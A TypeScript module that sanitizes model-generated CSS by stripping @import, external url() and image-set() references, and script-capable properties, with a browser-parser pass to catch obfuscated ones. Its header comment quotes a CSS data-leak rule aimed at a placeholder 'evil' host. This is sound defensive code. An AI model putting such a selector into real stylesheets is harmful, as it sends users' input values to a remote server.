/**
 * Clean up CSS produced by a model before it is shown or applied.
 *
 * Why: CSS can leak page data to remote servers (e.g. `input[value^="a"] { background: url(https://evil/a) }`)
 * and can pull remote resources. Generated CSS must therefore never reference anything outside the page.
 */

export interface SanitizeResult {
  css: string;
  warnings: string[];
}

/** Pull the stylesheet out of a model response (handles ```css fences, even unterminated while streaming). */
export function extractCss(text: string): string {
  const fence = /```(?:css)?[^\S\n]*\n([\s\S]*?)(?:```|$)/gi;
  let best = "";
  for (const match of text.matchAll(fence)) {
    const body = match[1] ?? "";
    if (body.length > best.length) best = body;
  }
  if (best) return best.trimEnd() + "\n";
  // No fence: strip a stray leading fence marker, if any, and use the raw text.
  return text.replace(/^```(?:css)?\s*/i, "").replace(/```\s*$/, "").trim() + "\n";
}

const URL_FN = /url\(\s*(?:"([^"]*)"|'([^']*)'|([^)]*?))\s*\)/gi;
const IMAGE_SET_STRING = /((?:-webkit-)?image-set\()([^)]*)\)/gi;

function stripExternal(css: string, warnings: Set<string>): string {
  let out = css.replace(/@import\b[^;]*;?/gi, () => {
    warnings.add("Removed @import rules.");
    return "";
  });
  out = out.replace(URL_FN, (whole, dq, sq, bare) => {
    const target = String(dq ?? sq ?? bare ?? "").trim();
    if (/^data:/i.test(target) || target.startsWith("#")) return whole;
    warnings.add("Removed external url() references.");
    return "none";
  });
  out = out.replace(IMAGE_SET_STRING, (whole, head, args: string) => {
    if (!/["']\s*(?:https?:|\/\/)/i.test(args)) return whole;
    warnings.add("Removed external image-set() references.");
    return "none";
  });
  // Legacy script-capable properties.
  out = out.replace(/(?:-moz-binding|behavior)\s*:[^;}]*;?/gi, () => {
    warnings.add("Removed script-capable properties.");
    return "";
  });
  out = out.replace(/expression\s*\(/gi, () => {
    warnings.add("Removed expression().");
    return "invalid(";
  });
  return out;
}

/** Re-serialize via the browser's CSS parser; normalises escapes so obfuscated url() can't slip through. */
function serialize(css: string): string | null {
  try {
    const sheet = new CSSStyleSheet();
    sheet.replaceSync(css); // replaceSync also ignores @import
    return Array.from(sheet.cssRules, (rule) => rule.cssText).join("\n");
  } catch {
    return null;
  }
}

function hasExternalReference(css: string): boolean {
  for (const match of css.matchAll(URL_FN)) {
    const target = String(match[1] ?? match[2] ?? match[3] ?? "").trim();
    if (!/^data:/i.test(target) && !target.startsWith("#")) return true;
  }
  return /@import/i.test(css) || /["']\s*(?:https?:|\/\/)/i.test(css);
}

function prettyPrint(css: string): string {
  return css
    .replace(/\s*\{\s*/g, " {\n  ")
    .replace(/;\s*(?!\n)/g, ";\n  ")
    .replace(/\s*\}\s*/g, "\n}\n\n")
    .replace(/ {2}\n\}/g, "}")
    .replace(/\n{3,}/g, "\n\n")
    .trim() + "\n";
}

export function sanitizeCss(raw: string): SanitizeResult {
  const warnings = new Set<string>();
  const cleaned = stripExternal(raw, warnings);
  const serialized = serialize(cleaned);

  if (serialized === null) {
    warnings.add("The browser could not parse this CSS; review it before saving.");
    return { css: cleaned, warnings: [...warnings] };
  }
  if (!serialized.trim() && cleaned.trim()) {
    warnings.add("The browser found no valid CSS rules in the response.");
  }
  if (!hasExternalReference(serialized)) {
    // Keep the model's original formatting and comments.
    return { css: cleaned, warnings: [...warnings] };
  }
  // Something survived only in obfuscated form: fall back to the normalised text.
  warnings.add("Rewrote obfuscated CSS that referenced external resources.");
  const strict = stripExternal(serialized, warnings);
  return { css: prettyPrint(strict), warnings: [...warnings] };
}
